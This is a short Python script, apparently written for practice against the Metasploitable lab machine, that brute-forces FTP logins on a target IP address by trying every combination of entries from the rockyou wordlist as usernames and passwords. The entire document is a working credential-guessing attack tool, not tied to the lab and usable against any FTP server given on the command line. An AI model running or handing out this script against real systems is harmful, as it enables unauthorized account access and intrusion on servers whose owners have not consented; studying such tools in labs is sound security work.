#Works with metasploitable
import ftplib
import argparse

class FtpBrute():
    obtained = False
    def brute(self, ip, usr, pwd):
        ftp = ftplib.FTP(ip)
        try:
            ftp.login(usr, pwd)
            ftp.quit()
            print("User {} with password {}".format(usr, pwd))
            self.obtained = True
        except Exception as e:
            print("Error {} while attemp to login.".format(e))

def main():
    parser = argparse.ArgumentParser(description= "Brute force to FTP protocol")
    parser.add_argument('-t', '--target', help="Target ip address")
    parser = parser.parse_args()

    ip = parser.target
    print("IP given: {}".format(ip)) 
    usrs = open("/usr/share/wordlists/rockyou.txt", "r" , encoding = "ISO-8859-1")
    usrs = usrs.read().split("\n")
    
    pwds = open("/usr/share/wordlists/rockyou.txt", "r", encoding = "ISO-8859-1")
    pwds = pwds.read().split("\n")
    
    ftpbrute = FtpBrute() 
    for user in usrs:
        for pwd in pwds:
            ftpbrute.brute(ip, user, pwd)

    
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("Error {}".format(e))